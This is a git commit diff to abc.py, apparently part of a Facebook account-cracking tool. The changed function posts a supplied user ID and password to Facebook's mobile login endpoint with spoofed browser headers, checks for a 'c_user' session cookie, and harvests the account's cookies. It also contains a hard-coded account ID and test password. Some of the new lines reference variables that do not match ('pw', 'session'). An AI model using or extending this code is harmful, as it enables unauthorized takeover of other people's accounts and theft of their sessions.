72316f35febdace0ee52deb0508cac762b653385
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-12-19 00:22:09 +0530

    Update abc.py

--- abc.py
+++ abc.py
@@ -1751,14 +1751,14 @@ def d(uid,pwx,tl):
             'fb_dtsg': 'NAcOlfpCOM2BFnghClV_Fbk2SejAMCvE1gYRFgP4Eh4s03fmjrbDwEA:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'params': json.dumps({"params": json.dumps({"server_params":{"credential_type":"password","username_text_input_id":"yzmero:69","password_text_input_id":"yzmero:70","login_source":"Login","login_credential_type":"none","server_login_source":"login","ar_event_source":"login_home_page","should_trigger_override_login_success_action":0,"should_trigger_override_login_2fa_action":0,"is_caa_perf_enabled":0,"reg_flow_source":"login_home_native_integration_point","caller":"gslr","is_from_landing_page":0,"is_from_empty_password":0,"is_from_password_entry_page":0,"is_from_assistive_id":0,"is_from_msplit_fallback":0,"INTERNALlatency_qpl_marker_id":36707139,"INTERNALlatency_qpl_instance_id":"211568211600414","device_id":None,"family_device_id":None,"waterfall_id":"9b12f14d-e937-4714-94bf-015a5d6b4db3","offline_experiment_group":None,"layered_homepage_experiment_group":None,"is_platform_login":0,"is_from_logged_in_switcher":0,"is_from_logged_out":0,"access_flow_version":"F2_FLOW"},"client_input_params":{"machine_id":"","contact_point":'100055788906433',"password":"#PWD_BROWSER:0:{}:{}".format(str(int(time.time())),'906443'),"accounts_list":[],"fb_ig_device_id":[],"secure_family_device_id":"","encrypted_msisdn":"","headers_infra_flow_id":"","try_num":1,"login_attempt_count":1,"event_flow":"login_manual","event_step":"home_page","openid_tokens":{},"auth_secure_device_id":"","client_known_key_hash":"","has_whatsapp_installed":0,"sso_token_map_json_string":"","should_show_nested_nta_from_aymh":0,"password_contains_non_ascii":"false","has_granted_read_contacts_permissions":0,"has_granted_read_phone_permissions":0,"app_manager_id":"","lois_settings":{"lois_token":"","lara_override":""}}})}),}
+            'params': json.dumps({"params": json.dumps({"server_params":{"credential_type":"password","username_text_input_id":"yzmero:69","password_text_input_id":"yzmero:70","login_source":"Login","login_credential_type":"none","server_login_source":"login","ar_event_source":"login_home_page","should_trigger_override_login_success_action":0,"should_trigger_override_login_2fa_action":0,"is_caa_perf_enabled":0,"reg_flow_source":"login_home_native_integration_point","caller":"gslr","is_from_landing_page":0,"is_from_empty_password":0,"is_from_password_entry_page":0,"is_from_assistive_id":0,"is_from_msplit_fallback":0,"INTERNALlatency_qpl_marker_id":36707139,"INTERNALlatency_qpl_instance_id":"211568211600414","device_id":None,"family_device_id":None,"waterfall_id":"9b12f14d-e937-4714-94bf-015a5d6b4db3","offline_experiment_group":None,"layered_homepage_experiment_group":None,"is_platform_login":0,"is_from_logged_in_switcher":0,"is_from_logged_out":0,"access_flow_version":"F2_FLOW"},"client_input_params":{"machine_id":"","contact_point":uid,"password":"#PWD_BROWSER:0:{}:{}".format(str(int(time.time())),pw),"accounts_list":[],"fb_ig_device_id":[],"secure_family_device_id":"","encrypted_msisdn":"","headers_infra_flow_id":"","try_num":1,"login_attempt_count":1,"event_flow":"login_manual","event_step":"home_page","openid_tokens":{},"auth_secure_device_id":"","client_known_key_hash":"","has_whatsapp_installed":0,"sso_token_map_json_string":"","should_show_nested_nta_from_aymh":0,"password_contains_non_ascii":"false","has_granted_read_contacts_permissions":0,"has_granted_read_phone_permissions":0,"app_manager_id":"","lois_settings":{"lois_token":"","lara_override":""}}})}),}
             headers = {
-            'authority': 'm.facebook.com',
+            'authority': 'mbasic.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyOTk2OTY2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyOTk2OTY2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1771,9 +1771,9 @@ def d(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=3b28ecba8057a045e1ccd369a35e6bbbd1312656df81eb2ee2c12804d45d06f0'
-            response = Session.post(url, data=data, headers=headers)
-            if "c_user" in response.cookies:
+            url = 'https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=3b28ecba8057a045e1ccd369a35e6bbbd1312656df81eb2ee2c12804d45d06f0'
+            response = Session.post(url, data=data, headers=headers).text
+            if "c_user" in session.cookies:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
